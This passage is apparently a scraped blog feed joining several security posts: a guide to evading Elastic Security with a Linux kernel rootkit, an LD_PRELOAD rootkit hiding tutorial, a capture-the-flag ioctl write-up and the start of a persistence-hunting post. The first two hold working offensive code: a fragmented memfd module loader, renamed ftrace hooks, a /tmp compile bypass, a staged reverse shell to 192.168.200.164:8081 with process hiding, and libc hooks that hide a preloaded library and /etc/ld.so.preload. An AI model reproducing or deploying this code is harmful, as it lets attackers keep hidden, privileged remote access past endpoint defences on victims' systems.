(anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir 